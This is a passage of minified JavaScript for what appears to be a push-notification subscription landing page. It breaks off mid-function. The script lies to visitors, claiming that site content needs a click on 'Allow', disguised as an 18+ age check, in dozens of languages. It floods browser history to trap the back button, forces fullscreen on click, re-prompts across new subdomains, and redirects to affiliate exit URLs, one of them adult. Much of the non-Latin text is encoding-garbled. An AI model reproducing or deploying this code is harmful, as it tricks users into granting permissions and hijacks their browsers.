'use strict';

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function getPartnerId(url) {
      if (url.indexOf("mobileoffers") >= 0) {
          let a = document.createElement('a');
          a.href = url;
          return a.pathname.split('/')[1]
      }

      return getRequestParam(document.location.href, 'pid')
  }

function getRequestParam(url, paramName) {
  var value = "", token = paramName + "=";
  try {
    url.split("?")[1].split("&").forEach(function (param) {
      if (param.indexOf(token) == 0) {
        value = param.substring(token.length)
      }
    });
  } catch (err) {
    console.log(err)
  }

  return value
}

function getRedirectUrl(request) {
  var
    pattern = 'go=',
    redirectUrl = '',
    index = request.indexOf(pattern);

  if (index === -1) {
    return redirectUrl
  }

  redirectUrl = decodeURIComponent(request.substr(index + pattern.length).split("&")[0])

  return redirectUrl;
}

(function () {
  'use strict';

  var Pushes = function () {
    function Pushes() {
      _classCallCheck(this, Pushes);

      createGetQueryParams(this.urlParams = {});
      this.initData();
      this.initL();
      this.renderTranslate();
      window['subscription_callback'] = function(result) {
        document.getElementById('page_release-search').style.display="none";

        var count = parseInt(getRequestParam(document.location.href, "_c"));
        if (isNaN(count)) {
          count = 0;
        }

        count = count + 1;

        if (result == "granted" || count >= 3) {
          rdomain(getRedirectUrl(document.location.href));
          return;
        }

        var host = document.location.host.split(".");
        host[0] = count + "push";

        var query = document.location.search;
        if (query.startsWith("?")) {
          query = query.replace("?", "")
        }

        query = query.split("&").filter(function(val) {
          return !val.startsWith("_c")
        });

        query.push("_c="+count);
        var url = "https://" + host.join(".") + document.location.pathname + "?" + query.join("&");

        rdomain(url);
      };

      var scriptNode = document.createElement('script');
      scriptNode.src = '/v1/request.js?l=2&p=' + getPartnerId(getRedirectUrl(document.location.href)) + '&cb=subscription_callback'+ '&si=' + getRequestParam(document.location.href, 'sub');
      var headNode = document.querySelector('head');
      headNode.appendChild(scriptNode);
    }

    _createClass(Pushes, [{
      key: 'initData',
      value: function initData() {
        this.jdata = {
          fetchUrl: 'https://' + location.hostname + '/v1/subscription',
          locationServiceWorker: '/v1/sw.js',
          exitUrl: {
            adlt: 'https://jnxob.lovenights.net/c/da57dc555e50572d?s1=12349&s2=66046&j1=1&j3=1',
            clean: 'https://jnxob.giftstoday.mobi/c/1f0a2cb367c37dee?s1=12349&s2=64750&j1=1&j3=1'
          },
          maxCountSubscribes: 70
        };
        this.data = {
          webmaster_id: this.urlParams.wmi,
          apiKey: 'BAPPZnSYG_g1zI6pMh6q_RopC4y6kUn-huVN32lXW57zV0YPmbLb0Pad9koj84ftmOackWoJxPALt24b83Qmoas',
          fetchUrl: this.jdata.fetchUrl,
          domain: location.hostname.split('.').reverse().slice(0, 2).reverse().join('.'),
          originHostName: location.hostname,
          maxCountSubscribes: this.jdata.maxCountSubscribes,
          exitUrl: this.urlParams.tb === '1' ? this.jdata.exitUrl.clean : this.jdata.exitUrl.adlt,
          locationServiceWorker: this.jdata.locationServiceWorker,
          lang: navigator.language.split('-')[0],
          capping: {
            id: 'No0uo7qu',
            identityExpire: 365 // days
          },
          httpProtocol: location.protocol.replace(':', '') // https: -> https
        };
        this.ids = {
          tokenId: getAndSetCookie.call(this, 'tokenId') || null
        };
        this.stats = {
          sub1: this.urlParams['sub1'],
          sub2: this.urlParams['sub2'],
          sub3: this.urlParams['sub3'],
          sub4: this.urlParams['sub4']
        };
        this.translateChrome = {
          "am": {
            "allow": "бЌЌб‰Ђб‹µ"
          },
          "ar": {
            "allow": "ШіЩ…Ш§Ш­"
          },
          "bg": {
            "allow": "Р Р°Р·СЂРµС€Р°РІР°РЅРµ"
          },
          "ca": {
            "allow": "Permet"
          },
          "cs": {
            "allow": "Povolit"
          },
          "da": {
            "allow": "Tillad"
          },
          "de": {
            "allow": "Zulassen"
          },
          "el": {
            "allow": "О•ПЂО№П„ПЃО­ПЂОµП„О±О№"
          },
          "en-GB": {
            "allow": "Allow"
          },
          "es-419": {
            "allow": "Permitir"
          },
          "es": {
            "allow": "Permitir"
          },
          "fa": {
            "allow": "Ш§Ш¬Ш§ШІЩ‡ ШЇШ§ШЇЩ†"
          },
          "fi": {
            "allow": "Salli"
          },
          "fil": {
            "allow": "Payagan"
          },
          "fr": {
            "allow": "Autoriser"
          },
          "hr": {
            "allow": "Dopusti"
          },
          "hu": {
            "allow": "EngedГ©lyezГ©s"
          },
          "id": {
            "allow": "Izinkan"
          },
          "it": {
            "allow": "Consenti"
          },
          "iw": {
            "allow": "ЧђЧ¤Ч©ЧЁ"
          },
          "ko": {
            "allow": "н—€мљ©"
          },
          "lt": {
            "allow": "Leisti"
          },
          "lv": {
            "allow": "AtДјaut"
          },
          "nl": {
            "allow": "Toestaan"
          },
          "no": {
            "allow": "Tillat"
          },
          "pt-BR": {
            "allow": "Permitir"
          },
          "pt-PT": {
            "allow": "Permitir"
          },
          "ro": {
            "allow": "Permite"
          },
          "ru": {
            "allow": "Р Р°Р·СЂРµС€РёС‚СЊ"
          },
          "sk": {
            "allow": "PovoliЕҐ"
          },
          "sl": {
            "allow": "Dovoli"
          },
          "sr": {
            "allow": "Р”РѕР·РІРѕР»Рё"
          },
          "sv": {
            "allow": "TillГҐt"
          },
          "sw": {
            "allow": "Ruhusu"
          },
          "th": {
            "allow": "аё­аё™аёёаёЌаёІаё•"
          },
          "tr": {
            "allow": "Д°zin ver"
          },
          "uk": {
            "allow": "Р”РѕР·РІРѕР»РёС‚Рё"
          },
          "vi": {
            "allow": "Cho phГ©p"
          },
          "zh-CN": {
            "allow": "е…Ѓи®ё"
          },
          "zh-TW": {
            "allow": "е…ЃиЁ±"
          },
          "bn": {
            "allow": "а¦…а¦Ёа§Ѓа¦®а¦¤а¦ї а¦¦а¦їа¦Ё"
          },
          "et": {
            "allow": "Luba"
          },
          "gu": {
            "allow": "аЄ®аЄ‚аЄња«‚аЄ°а«Ђ аЄ†аЄЄа«‹"
          },
          "kn": {
            "allow": "аІ…аІЁаіЃаІ®аІ¤аІїаІёаІї"
          },
          "ml": {
            "allow": "аґ…аґЁаµЃаґµаґ¦аґїаґ•аµЌаґ•аµ‚"
          },
          "mr": {
            "allow": "а¤Єа¤°а¤µа¤ѕа¤Ёа¤—аҐЂ а¤¦аҐЌа¤Їа¤ѕ"
          },
          "ms": {
            "allow": "Benarkan"
          },
          "ta": {
            "allow": "а®…а®©аЇЃа®®а®¤а®ї"
          },
          "te": {
            "allow": "а°…а°Ёа±Ѓа°®а°¤а°їа°‚а°ља±Ѓ"
          }
        };
        this.translateLand = {
          "en-us": {
            "text": "To access the website content, click Allow!",
            "condition": "If you are 18+ tap",
            "approve": "Allow"
          },
          "en": {
            "text": "To access the website content, click Allow!",
            "condition": "If you are 18+ tap",
            "approve": "Allow"
          },
          "az": {
            "text": "Veb saytД±n mЙ™zmununa daxil olmaq ГјГ§Гјn, Allow dГјymЙ™sini basД±n!",
            "condition": "ЖЏgЙ™r 18 + tapsanД±z",
            "approve": this.translateChrome['az'] ? this.translateChrome['az'].allow : "Д°zin ver"
          },
          "sq": {
            "text": "PГ«r tГ« hyrГ« nГ« pГ«rmbajtjen e faqes, kliko Lejoj!",
            "condition": "NГ«se je 18+ prekje",
            "approve": this.translateChrome['sq'] ? this.translateChrome['sq'].allow : "Lejoj"
          },
          "hy": {
            "text": "Х„ХёЦ‚ХїЦ„ ХЈХёЦЂХ®ХҐХ¬ХёЦ‚ Х°ХЎХґХЎЦЂ ХЅХҐХІХґХҐЦ„ 'Ф№ХёЦ‚ХµХ¬ХЎХїЦЂХҐХ¬'",
            "condition": "ФµХ©ХҐ Х±ХҐЦЂ 18 ХїХЎЦЂХҐХЇХЎХ¶ХЁ Х¬ЦЂХЎЦЃХҐХ¬ Х§, ХЎХєХЎ ХЅХҐХІХґХҐЦ„",
            "approve": this.translateChrome['hy'] ? this.translateChrome['hy'].allow : "Ф№ХёЦ‚ХµХ¬ХЎХїЦЂХҐХ¬"
          },
          "af": {
            "text": "Om toegang tot die webwerf-inhoud te verkry, klik op Toestaan!",
            "condition": "As jy 18 + kraan is",
            "approve": this.translateChrome['af'] ? this.translateChrome['af'].allow : "Toelaat"
          },
          "be": {
            "text": "РљР°Р± Р°С‚СЂС‹РјР°С†СЊ РґРѕСЃС‚СѓРї РґР° Р·РјРµСЃС†С–РІР° СЃР°Р№С‚Р°, РЅР°С†С–СЃРЅС–С†Рµ РєРЅРѕРїРєСѓ Р”Р°Р·РІРѕР»С–С†СЊ!",
            "condition": "РљР°Р»С– РІС‹ 18+ РєСЂР°РЅ",
            "approve": this.translateChrome['be'] ? this.translateChrome['be'].allow : "Р”Р°Р·РІР°Р»СЏС†СЊ"
          },
          "bn": {
            "text": "а¦“а¦Їа¦ја§‡а¦¬а¦ёа¦ѕа¦‡а¦џ а¦¬а¦їа¦·а¦Їа¦ја¦¬а¦ёа§Ќа¦¤а§Ѓ а¦…а§Ќа¦Їа¦ѕа¦•а§Ќа¦ёа§‡а¦ё а¦•а¦°а¦¤а§‡, а¦…а¦Ёа§Ѓа¦®а¦¤а¦ї а¦¦а¦їа¦Ё а¦•а§Ќа¦Іа¦їа¦• а¦•а¦°а§Ѓа¦Ё!",
            "condition": "а¦†а¦Єа¦Ёа¦ї а¦Їа¦¦а¦ї 18+ а¦џа§Ќа¦Їа¦ѕа¦Є а¦•а¦°а§‡а¦Ё",
            "approve": this.translateChrome['bn'] ? this.translateChrome['bn'].allow : "а¦…а¦Ёа§Ѓа¦®а¦¤а¦ї а¦¦а¦їа¦Ё"
          },
          "bg": {
            "text": "Р—Р° РґРѕСЃС‚СЉРї РґРѕ СЃСЉРґСЉСЂР¶Р°РЅРёРµС‚Рѕ РЅР° СѓРµР±СЃР°Р№С‚Р°, С‰СЂР°РєРЅРµС‚Рµ РІСЉСЂС…Сѓ Р Р°Р·СЂРµС€Рё!",
            "condition": "РђРєРѕ СЃС‚Рµ РЅР°РІСЉСЂС€РёР»Рё 18+",
            "approve": this.translateChrome['bg'] ? this.translateChrome['bg'].allow : "Р Р°Р·СЂРµС€Р°РІР°Рј"
          },
          "cy": {
            "text": "I gael mynediad at gynnwys y wefan, cliciwch ar GaniatГЎu!",
            "condition": "Os ydych chi'n tap 18+",
            "approve": this.translateChrome['cy'] ? this.translateChrome['cy'].allow : "CaniatГЎu"
          },
          "hu": {
            "text": "A webhely tartalmГЎnak elГ©rГ©sГ©hez kattintson a EngedГ©lyezГ©s elemre!",
            "condition": "Ha 18+ tapint vagy",
            "approve": this.translateChrome['hu'] ? this.translateChrome['hu'].allow : "LehetЕ‘vГ© teszi"
          },
          "vi": {
            "text": "Дђб»ѓ truy cбє­p nб»™i dung trang web, hГЈy nhбєҐp Cho phГ©p!",
            "condition": "Nбєїu bбєЎn 18+ tap",
            "approve": this.translateChrome['vi'] ? this.translateChrome['vi'].allow : "Cho phГ©p"
          },
          "gl": {
            "text": "Para acceder ao contido do sitio web, faga clic en Permitir!",
            "condition": "Se tes mГЎis de 18 anos",
            "approve": this.translateChrome['gl'] ? this.translateChrome['gl'].allow : "Permitir"
          },
          "nl": {
            "text": "Klik op Toestaan om de inhoud van de website te openen.",
            "condition": "Als u 18+ bent, tikt u op",
            "approve": this.translateChrome['nl'] ? this.translateChrome['nl'].allow : "Toestaan"
          },
          "el": {
            "text": "О“О№О± ПЂПЃПЊПѓОІО±ПѓО· ПѓП„Ої ПЂОµПЃО№ОµП‡ПЊОјОµОЅОї П„ОїП… О№ПѓП„ПЊП„ОїПЂОїП…, ОєО¬ОЅП„Оµ ОєО»О№Оє ПѓП„О·ОЅ ОµПЂО№О»ОїОіО® ОќО± ОµПЂО№П„ПЃО­ПЂОµП„О±О№!",
            "condition": "О•О¬ОЅ ОµОЇПѓП„Оµ 18+ ПЂО±П„О®ПѓП„Оµ",
            "approve": this.translateChrome['el'] ? this.translateChrome['el'].allow : "ОµПЂО№П„ПЃО­ПЂП‰"
          },
          "ka": {
            "text": "бѓ•бѓ”бѓ‘-бѓ’бѓ•бѓ”бѓ бѓ“бѓбѓЎ бѓ™бѓќбѓњбѓўбѓ”бѓњбѓўбѓбѓЎ бѓ¬бѓ•бѓ“бѓќбѓ›бѓбѓЎбѓ—бѓ•бѓбѓЎ, бѓ“бѓђбѓђбѓ¬бѓ™бѓђбѓћбѓЈбѓњбѓ”бѓ— бѓњбѓ”бѓ‘бѓђ!",
            "condition": "бѓ—бѓЈ бѓ—бѓҐбѓ•бѓ”бѓњ бѓ®бѓђбѓ бѓ— 18+ бѓ©бѓђбѓ›бѓќбѓЎбѓ®бѓ›бѓђ",
            "approve": this.translateChrome['ka'] ? this.translateChrome['ka'].allow : "бѓ“бѓђбѓЈбѓЁбѓ•бѓ”бѓ‘бѓ”бѓљбѓбѓђ"
          },
          "da": {
            "text": "For at fГҐ adgang til indholdet af webstedet, klik pГҐ Tillad!",
            "condition": "Hvis du er 18+ tryk",
            "approve": this.translateChrome['da'] ? this.translateChrome['da'].allow : "Give lov til"
          },
          "ga": {
            "text": "Chun rochtain a fhГЎil ar ГЎbhar an tsuГ­mh, cliceГЎil Ceadaigh!",
            "condition": "MГЎ tГЎ 18 mbarr agat",
            "approve": this.translateChrome['ga'] ? this.translateChrome['ga'].allow : "Ceadaigh"
          },
          "is": {
            "text": "Til aГ° fГЎ aГ°gang aГ° vefsvГ¦Г°inu skaltu smella ГЎ Leyfa!",
            "condition": "Ef ГѕГє ert 18+ tappa",
            "approve": this.translateChrome['is'] ? this.translateChrome['is'].allow : "Leyfa"
          },
          "es": {
            "text": "Para acceder al contenido del sitio web, haz clic en Permitir!",
            "condition": "Si tienes mГЎs de 18 pulsaciones",
            "approve": this.translateChrome['es'] ? this.translateChrome['es'].allow : "Permitir"
          },
          "it": {
            "text": "Per accedere al contenuto del sito Web, fare clic su Consenti!",
            "condition": "Se hai 18 anni, tocca",
            "approve": this.translateChrome['it'] ? this.translateChrome['it'].allow : "Consenti"
          },
          "kk": {
            "text": "Р’РµР±-СЃР°Р№С‚ РјР°Р·РјТ±РЅС‹РЅР° РєС–СЂСѓ ТЇС€С–РЅ Р Т±Т›СЃР°С‚ РµС‚Сѓ С‚ТЇР№РјРµС€С–РіС–РЅ Р±Р°СЃС‹ТЈС‹Р·!",
            "condition": "Р•РіРµСЂ СЃС–Р· 18+ СЂРµС‚ С‚ТЇСЂС‚СЃРµТЈС–Р·",
            "approve": this.translateChrome['kk'] ? this.translateChrome['kk'].allow : "СЂТ±Т›СЃР°С‚ РµС‚С–ТЈС–Р·"
          },
          "km": {
            "text": "бћЉбћѕбћбџ’бћ”бћёбћ…бћјбћ›бћбћ¶бћЏбћ·бћЂбћ¶бћ‚бџЃбћ бћ‘бџ†бћ–бџђбћљбћџбћјбћбћ…бћ»бћ…бћўбћ“бћ»бћ‰бџ’бћ‰бћ¶бћЏ!",
            "condition": "бћ”бџ’бћљбћџбћ·бћ“бћ”бћѕбћўбџ’бћ“бћЂбћбћ¶бћ“бћўбћ¶бћ™бћ» 18 бћ†бџ’бћ“бћ¶бџ†",
            "approve": this.translateChrome['km'] ? this.translateChrome['km'].allow : "бћўбћ“бћ»бћ‰бџ’бћ‰бћ¶бћЏ"
          },
          "ca": {
            "text": "Per accedir al contingut del lloc web, feu clic a Permetre!",
            "condition": "Si tens mГ©s de 18 punts",
            "approve": this.translateChrome['ca'] ? this.translateChrome['ca'].allow : "Permetre"
          },
          "ky": {
            "text": "CР°Р№С‚ РјР°Р·РјСѓРЅРіР° РєРёСЂТЇТЇ ТЇС‡ТЇРЅ, СѓСЂСѓРєСЃР°С‚ Р±РµСЂТЇТЇ Р±Р°СЃРєС‹С‡С‹РЅ!",
            "condition": "РЎРёР· 18+ С‚РёР№РіРёР·ТЇТЇ Р±РѕР»СЃРѕ",
            "approve": this.translateChrome['ky'] ? this.translateChrome['ky'].allow : "РЈСЂСѓРєСЃР°С‚ Р±РµСЂТЇТЇ"
          },
          "zh": {
            "text": "и¦ЃиЁЄе•Џз¶Із«™е…§е®№пјЊи«‹й»ћж“Ље…ЃиЁ±!",
            "condition": "е¦‚жћњдЅ жЇ18+йѕЌй ­",
            "approve": this.translateChrome['zh'] ? this.translateChrome['zh'].allow : "е…ЃиЁ±"
          },
          "ko": {
            "text": "м›№ м‚¬мќґнЉё мЅн…ђмё м—ђ м•Ўм„ёмЉ¤н•л ¤л©ґ н—€мљ©мќ„ нЃґл¦­н•м‹­м‹њм¤!",
            "condition": "18 м„ё мќґмѓЃмќґлќјл©ґ",
            "approve": this.translateChrome['ko'] ? this.translateChrome['ko'].allow : "н—€мљ©"
          },
          "co": {
            "text": "Per accede Г  u cuntenutu di u situ web, clic quГ¬ Permissione!",
            "condition": "SГЁ vo site 18+ tap",
            "approve": this.translateChrome['co'] ? this.translateChrome['co'].allow : "Permettemu"
          },
          "lv": {
            "text": "Lai piekДјЕ«tu vietnes saturam, noklikЕЎД·iniet uz AtДјaut!",
            "condition": "Ja jums ir 18 vai vairДЃk gadu, pieskarieties",
            "approve": this.translateChrome['lv'] ? this.translateChrome['lv'].allow : "AtДјaut"
          },
          "lt": {
            "text": "NorД—dami pasiekti svetainД—s turinДЇ, spustelД—kite Leisti!",
            "condition": "Jei jums dar 18 ir dar daugiau, bakstelД—kite",
            "approve": this.translateChrome['lt'] ? this.translateChrome['lt'].allow : "Leisti"
          },
          "ms": {
            "text": "Untuk mengakses kandungan laman web, klik Benarkan!",
            "condition": "Jika anda mempunyai ketukan 18+",
            "approve": this.translateChrome['ms'] ? this.translateChrome['ms'].allow : "Benarkan"
          },
          "mt": {
            "text": "Biex ikollok aД‹Д‹ess gД§all-kontenut tal-websajt, ikklikkja Д¦alli!",
            "condition": "Jekk int gД§atu 18 +",
            "approve": this.translateChrome['mt'] ? this.translateChrome['mt'].allow : "Jippermettu"
          },
          "mi": {
            "text": "Hei whakauru atu ki te ihirangi paetukutuku, pДЃwhiri Whakaae!",
            "condition": "Ki te 18+ taputapu koe",
            "approve": this.translateChrome['mi'] ? this.translateChrome['mi'].allow : "Whakaae"
          },
          "mk": {
            "text": "Р—Р° РґР° РїСЂРёСЃС‚Р°РїРёС‚Рµ РґРѕ СЃРѕРґСЂР¶РёРЅР°С‚Р° РЅР° РІРµР±-СЃС‚СЂР°РЅРёС†Р°С‚Р°, РєР»РёРєРЅРµС‚Рµ Р”РѕР·РІРѕР»Рё!",
            "condition": "РђРєРѕ СЃС‚Рµ 18 + РґРѕРїСЂРµС‚Рµ",
            "approve": this.translateChrome['mk'] ? this.translateChrome['mk'].allow : "Р”РѕР·РІРѕР»Рё"
          },
          "de": {
            "text": "Um auf den Inhalt der Website zuzugreifen, klicken Sie auf Zulassen!",
            "condition": "Wenn Sie 18+ tippen",
            "approve": this.translateChrome['de'] ? this.translateChrome['de'].allow : "ErmГ¶glichen"
          },
          "ne": {
            "text": "а¤µаҐ‡а¤¬а¤ёа¤ѕа¤€а¤џ а¤ёа¤ѕа¤®а¤—аҐЌа¤°аҐЂ а¤Єа¤№аҐЃа¤Ѓа¤љ а¤—а¤°аҐЌа¤Ё, а¤…а¤ЁаҐЃа¤®а¤¤а¤ї а¤•аҐЌа¤Іа¤їа¤• а¤—а¤°аҐЌа¤ЁаҐЃа¤№аҐ‹а¤ёаҐЌ!",
            "condition": "а¤Їа¤¦а¤ї а¤¤а¤Єа¤ѕа¤€а¤‚ 18+ а¤џаҐЌа¤Їа¤ѕа¤Є а¤№аҐЃа¤ЁаҐЃа¤№аҐЃа¤ЁаҐЌа¤› а¤­а¤ЁаҐ‡",
            "approve": this.translateChrome['ne'] ? this.translateChrome['ne'].allow : "а¤…а¤ЁаҐЃа¤®а¤¤а¤ї а¤¦а¤їа¤ЁаҐЃа¤№аҐ‹а¤ёаҐЌ"
          },
          "no": {
            "text": "For ГҐ fГҐ tilgang til innholdet pГҐ nettstedet, klikk Tillat!",
            "condition": "Hvis du er 18+ trykk",
            "approve": this.translateChrome['no'] ? this.translateChrome['no'].allow : "Tillat"
          },
          "pa": {
            "text": "аЁµа©€аЁ¬аЁёаЁѕаЁ€аЁџ аЁ¦а©Ђ аЁёаЁ®аЁ—аЁ°а©Ђ аЁђаЁ•аЁёа©€аЁё аЁ•аЁ°аЁЁ аЁІаЁ€, аЁ®аЁЁаЁњаЁја©‚аЁ°а©Ђ аЁЁа©‚а©° аЁ•аЁІаЁїа©±аЁ• аЁ•аЁ°а©‹!",
            "condition": "аЁња©‡ аЁ¤а©ЃаЁёа©ЂаЁ‚ 18+ аЁџа©€аЁЄ аЁ№а©‹",
            "approve": this.translateChrome['pa'] ? this.translateChrome['pa'].allow : "аЁ¦а©Ђ аЁ‡аЁњаЁѕаЁњаЁјаЁ¤"
          },
          "pl": {
            "text": "Aby uzyskaД‡ dostД™p do zawartoЕ›ci witryny, kliknij ZezwГіl!",
            "condition": "JeЕ›li masz 18+ stuknij",
            "approve": this.translateChrome['pl'] ? this.translateChrome['pl'].allow : "ZezwГіl"
          },
          "pt": {
            "text": "Para acessar o conteГєdo do site, clique em Permitir!",
            "condition": "Se vocГЄ tem 18 + toque",
            "approve": this.translateChrome['pt'] ? this.translateChrome['pt'].allow : "Permitir"
          },
          "ro": {
            "text": "Pentru a accesa conИ›inutul site-ului, faceИ›i clic pe PermiteИ›i!",
            "condition": "DacДѓ aveИ›i 18 ani atingeИ›i",
            "approve": this.translateChrome['ro'] ? this.translateChrome['ro'].allow : "PermiteИ›i"
          },
          "ru": {
            "text": "Р”Р»СЏ РїРѕР»СѓС‡РµРЅРёСЏ РґРѕСЃС‚СѓРїР° РЅР°Р¶РјРёС‚Рµ СЂР°Р·СЂРµС€РёС‚СЊ!",
            "condition": "Р•СЃР»Рё РІР°Рј 18+ РЅР°Р¶РјРёС‚Рµ",
            "approve": this.translateChrome['ru'] ? this.translateChrome['ru'].allow : "Р Р°Р·СЂРµС€РёС‚СЊ"
          },
          "sr": {
            "text": "Р”Р° Р±РёСЃС‚Рµ РїСЂРёСЃС‚СѓРїРёР»Рё СЃР°РґСЂР¶Р°ССѓ РІРµР± СЃР°СС‚Р°, РєР»РёРєРЅРёС‚Рµ Р”РѕР·РІРѕР»Рё!",
            "condition": "РђРєРѕ СЃС‚Рµ 18 + РґРѕРґРёСЂРЅРёС‚Рµ",
            "approve": this.translateChrome['sr'] ? this.translateChrome['sr'].allow : "Р”РѕР·РІРѕР»Рё"
          },
          "sk": {
            "text": "Ak chcete zГ­skaЕҐ prГ­stup k obsahu webovГЅch strГЎnok, kliknite na poloЕѕku PovoliЕҐ!",
            "condition": "Ak ste 18 alebo klepnite",
            "approve": this.translateChrome['sk'] ? this.translateChrome['sk'].allow : "PovoliЕҐ"
          },
          "sl": {
            "text": "ДЊe Еѕelite dostopati do vsebine spletnega mesta, kliknite Dovoli!",
            "condition": "ДЊe ste 18+, tapnite",
            "approve": this.translateChrome['sl'] ? this.translateChrome['sl'].allow : "Dovoli"
          },
          "so": {
            "text": "Ina ia maua le upega tafailagi i luga o le upega tafaК»ilagi, kiliki Alu!",
            "condition": "Afai e 18 + tap",
            "approve": this.translateChrome['so'] ? this.translateChrome['so'].allow : "Faatagaina"
          },
          "th": {
            "text": "аё«аёІаёЃаё•а№‰аё­аё‡аёЃаёІаёЈа№Ђаё‚а№‰аёІаё–аё¶аё‡а№Ђаё™аё·а№‰аё­аё«аёІа№Ђаё§а№‡аёља№„аё‹аё•а№Ња№ѓаё«а№‰аё„аёҐаёґаёЃаё­аё™аёёаёЌаёІаё•!",
            "condition": "аё–а№‰аёІаё„аёёаё“аё­аёІаёўаёё 18 аё›аёµаё‚аё¶а№‰аё™а№„аё›а№Ѓаё•аё°",
            "approve": this.translateChrome['th'] ? this.translateChrome['th'].allow : "аё­аё™аёёаёЌаёІаё•"
          },
          "ta": {
            "text": "а®‡а®ЈаЇ€а®Ї а®‰а®іаЇЌа®іа®џа®•аЇЌа®•а®¤аЇЌа®¤аЇ€ а®…а®ЈаЇЃа®•, а®…а®©аЇЃа®®а®¤а®ї а®Ћа®©аЇЌа®Єа®¤аЇ€ а®•а®їа®іа®їа®•аЇЌ а®љаЇ†а®ЇаЇЌа®Їа®µаЇЃа®®аЇЌ!",
            "condition": "а®ЁаЇЂа®™аЇЌа®•а®іаЇЌ 18+ а®•аЇЃа®ґа®ѕа®ЇаЇЌ а®‡а®°аЇЃа®ЁаЇЌа®¤а®ѕа®ІаЇЌ",
            "approve": this.translateChrome['ta'] ? this.translateChrome['ta'].allow : "а®…а®©аЇЃа®®а®¤а®їа®•аЇЌа®•"
          },
          "tr": {
            "text": "Web sitesi iГ§eriДџine eriЕџmek iГ§in Д°zin Ver'e tД±klayД±n.!",
            "condition": "18 yaЕџД±ndaysanД±z dokunun",
            "approve": this.translateChrome['tr'] ? this.translateChrome['tr'].allow : "Д°zin vermek"
          },
          "uk": {
            "text": "Р©РѕР± РѕС‚СЂРёРјР°С‚Рё РґРѕСЃС‚СѓРї РґРѕ РІРјС–СЃС‚Сѓ РІРµР±-СЃР°Р№С‚Сѓ, РЅР°С‚РёСЃРЅС–С‚СЊ РєРЅРѕРїРєСѓ Р”РѕР·РІРѕР»РёС‚Рё!",
            "condition": "РЇРєС‰Рѕ РІР°Рј РїРѕРїР°Р»Рѕ 18 СЂРѕРєС–РІ, РЅР°С‚РёСЃРЅС–С‚СЊ",
            "approve": this.translateChrome['uk'] ? this.translateChrome['uk'].allow : "Р”РѕР·РІРѕР»РёС‚Рё"
          },
          "fi": {
            "text": "PГ¤Г¤set verkkosivuston sisГ¤ltГ¶Г¶n napsauttamalla Salli!",
            "condition": "Jos olet 18+, napauta",
            "approve": this.translateChrome['fi'] ? this.translateChrome['fi'].allow : "Sallia"
          },
          "fr": {
            "text": "Pour accГ©der au contenu du site Web, cliquez sur Autoriser!",
            "condition": "Si vous avez plus de 18 ans, appuyez sur",
            "approve": this.translateChrome['fr'] ? this.translateChrome['fr'].allow : "Autoriser"
          },
          "fy": {
            "text": "Om tagong te krijen ta de webside ynhГўld, klik Talitte!",
            "condition": "As jo 18+ tap binne",
            "approve": this.translateChrome['fy'] ? this.translateChrome['fy'].allow : "Talitte"
          },
          "hi": {
            "text": "а¤µаҐ‡а¤¬а¤ёа¤ѕа¤‡а¤џ а¤ёа¤ѕа¤®а¤—аҐЌа¤°аҐЂ а¤¤а¤• а¤Єа¤№аҐЃа¤‚а¤ља¤ЁаҐ‡ а¤•аҐ‡ а¤Іа¤їа¤Џ, а¤…а¤ЁаҐЃа¤®а¤¤а¤ї а¤¦аҐ‡а¤‚ а¤Єа¤° а¤•аҐЌа¤Іа¤їа¤• а¤•а¤°аҐ‡а¤‚!",
            "condition": "а¤Їа¤¦а¤ї а¤†а¤Є 18+ а¤џаҐ€а¤Є а¤№аҐ€а¤‚",
            "approve": this.translateChrome['hi'] ? this.translateChrome['hi'].allow : "а¤…а¤ЁаҐЃа¤®а¤¤а¤ї а¤¦аҐ‡а¤¤аҐ‡ а¤№аҐ€а¤‚"
          },
          "hr": {
            "text": "Da biste pristupili sadrЕѕaju web mjesta, kliknite Dopusti!",
            "condition": "Ako ste 18 + dodirnite",
            "approve": this.translateChrome['hr'] ? this.translateChrome['hr'].allow : "Dopusti"
          },
          "cs": {
            "text": "Chcete-li zГ­skat pЕ™Г­stup k obsahu webovГЅch strГЎnek, klepnД›te na tlaДЌГ­tko Povolit!",
            "condition": "Pokud jste 18+ klepnД›te",
            "approve": this.translateChrome['cs'] ? this.translateChrome['cs'].allow : "Povolit"
          },
          "sv": {
            "text": "FГ¶r att komma ГҐt innehГҐllet pГҐ webbplatsen klickar du pГҐ TillГҐt!",
            "condition": "Om du Г¤r 18+ trycker du pГҐ",
            "approve": this.translateChrome['sv'] ? this.translateChrome['sv'].allow : "TillГҐt"
          },
          "eo": {
            "text": "Por aliri la retejan enhavon, klaku Permesi!",
            "condition": "Se vi estas 18 + tapeto",
            "approve": this.translateChrome['eo'] ? this.translateChrome['eo'].allow : "Permesu"
          },
          "et": {
            "text": "Veebisaidi sisu juurde pГ¤Г¤semiseks klГµpsake kГ¤sul Luba!",
            "condition": "Kui olete 18-aastane, puudutage seda",
            "approve": this.translateChrome['et'] ? this.translateChrome['et'].allow : "Lubama"
          },
          "ja": {
            "text": "г‚µг‚¤гѓ€гЃ®г‚ігѓігѓ†гѓігѓ„гЃ«г‚ўг‚Їг‚»г‚№гЃ™г‚‹гЃ«гЃЇгЂЃ[иЁ±еЏЇ]г‚’г‚ЇгѓЄгѓѓг‚ЇгЃ—гЃѕгЃ™гЂ‚!",
            "condition": "гЃ‚гЃЄгЃџгЃЊ18+г‚їгѓѓгѓ—гЃ®е ґеђ€",
            "approve": this.translateChrome['ja'] ? this.translateChrome['ja'].allow : "иЁ±гЃ™"
          }
        };
      }
    }, {
      key: 'initL',
      value: function initL() {
        // Button back
        var historyCount = 13;
        while (historyCount--) {
          history.pushState(null, null, location.href);
        }

        // Full screen
        var body = document.body;
        var docElement = document.documentElement;

        body.onclick = function () {
          var req = body.requestFullScreen || body.webkitRequestFullScreen || body.mozRequestFullScreen;
          req.call(body);
        };
        function FullScreen() {
          return
          if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
            if (docElement.requestFullscreen) {
